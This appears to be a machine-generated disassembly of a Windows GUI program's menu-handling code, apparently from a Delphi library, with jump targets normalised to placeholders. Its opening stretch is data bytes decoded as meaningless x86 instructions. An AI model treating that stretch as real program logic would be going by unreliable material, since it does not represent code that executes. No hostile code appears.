arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax + 0x24 ] dh
inc ebp
add [ eax + 0x1004524 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsd
enter 0x44d6 0x0
push es
or eax 0x6f42616d
insd
je r-xdata
jne r-xdata
pop esp
salc
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x61700874
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
adc [ ecx ] eax
sub al 0x2c
dec eax
outsd
je r-xdata
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
pushfd
fwait
inc ecx
add ah ah
adc bh 0x44
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
salc
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
xor al 0x40
add [ ebp - 0x28d3ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ esi + edx * 8 + 0x44 ] ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x29 ] dh
inc esp
add [ eax ] bh
add [ eax ] al
or bl dl
inc esp
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
outsd
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44d7 ] al
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
and dh dl
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
fcomp [ esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec [ esp ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
insb
mov cl 0x44
add [ eax ] cl
add bh bh
adc al 0x20
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
clc
cmp [ ecx ] al
pushfd
cmp al [ ecx ]
test [ ecx + eax * 2 ] bh
add [ ecx + edi + 0x41 ] cl
add al cl
cmp [ ecx ] eax
call 0xa451f0a
push esp
push eax
outsd
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
adc [ ecx ] al
xor [ eax ] al
add bh bh
clc
and eax [ ebp ]
inc ebp
add [ esp + ebp ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x11
inc ecx
add [ esp + ebp ] ch
in al 0xcd
inc esp
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
fiadd [ eax + eax + 0x8 ]
jo r-xdata
inc ebx
push 0x65676e61
mov [ ecx ] dl
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
salc
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
salc
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ edi + edx ] cl
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
inc ecx
insb
xlat
inc esp
add [ ebx + edx * 8 + 0x100044 ] bh
add eax 0x756e654d
jae r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + edx * 8 ] bl
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
rcl al 0xd9
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
fld [ eax + eax + 0x14 ]
add [ eax ] al
mov [ edx + eax * 2 ] bh
add ah ch
cmp al 0x42
add ah cl
cmp al 0x42
add [ eax + 0xe00423c ] bh
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax + 0x3b ] cl
inc edx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
imul esi [ ebx + 0x74 ] 0x44da3c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x26 ] cl
inc esp
add [ eax ] cl
imul esp [ edi + 0x6e ] 0x746e656d
in al 0xcd
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
add ah bl
aad 0x44
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_442254
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44da88
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43c9c4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_442254
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44dae0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44db18
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403fe0
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404250
sub_44db6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44dd55
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404078
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4041c8
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404078
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404078
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4041c8
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4041c8
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403fe0
mov eax esi
call sub_403fe0
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404078
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407f18
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042ec
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44db18
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042a8
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404078
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042a8
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4042a8
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd5c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404004
retn
sub_44dd70
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4042a0
push eax
mov eax edi
call sub_4042a0
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042a0
push eax
mov eax edi
call sub_4044a0
push eax
mov eax [ esi ]
call sub_4044a0
pop edx
pop ecx
call sub_407df8
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4042a0
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404540
sub_44ddcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404490
xor eax eax
push ebp
push sub_44dea7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44dd70
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44dd70
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44dd70
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44dd70
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44deae
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44db6c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407da8
test eax eax
jne r-xdata
sub_44dee4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_450484
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_450494
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44df44
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_450484
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_450484
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_450494
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_450494
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44dee4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44dee4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_450494
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_450494
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44e090
push ebx
mov ebx eax
mov eax ebx
call sub_44a780
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_452fa0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44e0c8
push ebx
mov ebx eax
mov eax ebx
call sub_44a794
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e0f8
push ebx
mov ebx eax
mov eax ebx
call sub_44a7a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e128
push ebx
mov ebx eax
mov eax ebx
call sub_44a7d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e158
push ebx
mov ebx eax
mov eax ebx
call sub_44a7f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4043ec
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e18c
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44a7bc
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e1c8
push ebx
mov ebx eax
mov eax ebx
call sub_44a80c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e1fc
push ebx
mov ebx eax
mov eax ebx
call sub_44a820
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e230
push ebx
mov ebx eax
mov eax ebx
call sub_44a834
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e264
push ebx
mov ebx eax
mov eax ebx
call sub_419d1c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e28c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44e2ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4502ec
sub_44e2cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45035c
sub_44e2ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4503b0
sub_44e30c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44e328
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_404034
sub_44e34c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4504dc
sub_44e36c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4504b8
sub_44e38c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4504cc
sub_44e3ac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44e3d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41942c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44dec4
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_450de8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_44e454
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_452d84
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_450484
test eax eax
jg r-xdata
mov edx esi
call sub_45081c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_450494
call sub_403290
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403290
lea eax [ esi + 0x44 ]
call sub_40cdfc
lea eax [ esi + 0x78 ]
call sub_40cdfc
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44e870
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413f48
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419478
test bl bl
jle r-xdata
call sub_403290
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_44e508
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e763
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e76a
lea eax [ ebp - 0x40 ]
call sub_403fe0
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404078
mov eax ebx
call sub_450484
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44ea18
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043ec
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_450484
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_450a40
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44db6c
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404360
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044a0
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4044a0
push eax
mov eax ebx
call sub_44ea18
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45005c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043ec
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
